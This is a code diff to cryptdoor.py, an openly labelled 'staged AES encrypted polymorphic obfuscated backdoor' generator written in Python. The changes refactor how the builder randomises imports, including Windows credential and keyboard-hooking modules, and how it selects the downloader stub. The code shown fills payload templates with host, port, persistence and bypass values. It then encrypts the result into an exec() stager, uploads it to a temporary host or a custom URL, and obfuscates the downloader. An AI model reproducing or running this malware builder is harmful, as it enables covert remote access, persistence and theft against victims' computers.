@@ -1,6 +1,6 @@
 #!/usr/bin/env python
 #
-# cryptdoor.py - AES encrypted polymorphic obfuscated backdoor
+# cryptdoor.py - Staged AES encrypted polymorphic obfuscated backdoor
 # by @d4rkcat github.com/d4rkcat
 #
 ## This program is free software: you can redistribute it and/or modify
@@ -152,6 +152,16 @@ else:
 		readyscript = finalbackdoor.read().replace('**n', '\\n').replace('***HOST***', hostname).replace('***PORT***', portnumber).replace('***SECRET***', secretkey).replace('**r', '\\r').replace('***PERSIST***', persistpart).replace('***AES***', AESvar).replace('***B64D***',bd64var).replace('***B64E***',be64var).replace('***PROXY***', proxysetting).replace('***WINSERVICES***', lswinservices).replace('***JUNK***', junk).replace('***64EXE***', bypass64).replace('***86EXE***', bypass86).replace('***JUNK2***', junk2)
 	myendings = ['from Crypto import Random', 'from Crypto.Cipher import AES as %s' % (AESvar), 'from base64 import b64decode as %s' % (bd64var), 'from base64 import b64encode as %s' % (be64var)]
 
+myimports = ['subprocess', 'platform', 'socket', 'os', 'struct', 'urllib2', 'binascii', 'ctypes', 'threading', 'string', 'sqlite3', 'requests', 'sys']
+mywindows = ['win32crypt', 'pyHook', 'pythoncom', 'win32api', 'win32gui', 'win32ui', 'win32con']
+
+if args.proxy:
+	mywindows.append('socks')
+
+random.shuffle(myimports)
+random.shuffle(myendings)
+random.shuffle(mywindows)
+
 cipher = AES.new(key)
 payload = EncodeAES(cipher, readyscript)
 downpayload = "exec(%s(\"%s\"))" % (bd64var,base64.b64encode("exec(%s.new(\"%s\").decrypt(%s(\"%s\")).rstrip('{'))\n" %(AESvar,key,bd64var,payload)))
@@ -163,29 +173,17 @@ if not args.customurl:
 	downurl = ftempsend('readme.txt')
 	print ' [*] Code uploaded to %s to expire in 1 %s.' % (downurl,expirestr)
 	os.remove('readme.txt')
+	dlf = 'stubs/downloader.py'
 else:
 	with open('code.txt', 'wb') as lf:
 		lf.write(downpayload)
 	print ' [V] Payload code written to code.txt'
 	print ' [V] Expecting it to be hosted at ' + args.customurl
 	downurl = args.customurl
+	dlf = 'stubs/downloader_cust.py'
 
-myimports = ['subprocess', 'platform', 'socket', 'os', 'struct', 'urllib2', 'binascii', 'ctypes', 'threading', 'string', 'sqlite3', 'requests', 'sys']
-mywindows = ['win32crypt', 'pyHook', 'pythoncom', 'win32api', 'win32gui', 'win32ui', 'win32con']
-
-if args.proxy:
-	mywindows.append('socks')
-
-random.shuffle(myimports)
-random.shuffle(myendings)
-random.shuffle(mywindows)
-
-if args.customurl:
-	with open('stubs/downloader_cust.py') as dl:
-		downloaderscript = dl.read().replace('***URL***', downurl)
-else:
-	with open('stubs/downloader.py') as dl:
-		downloaderscript = dl.read().replace('***URL***', downurl)
+with open(dlf) as dl:
+	downloaderscript = dl.read().replace('***URL***', downurl)
 with open('tempobfs.py', 'wb') as o:
 	o.write(downloaderscript)
 obstime = subprocess.Popen('python pyobfuscate.py -s %s tempobfs.py' % (''.join(random.choice(string.ascii_letters + string.digits) for x in range(random.randint(25,80)))), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
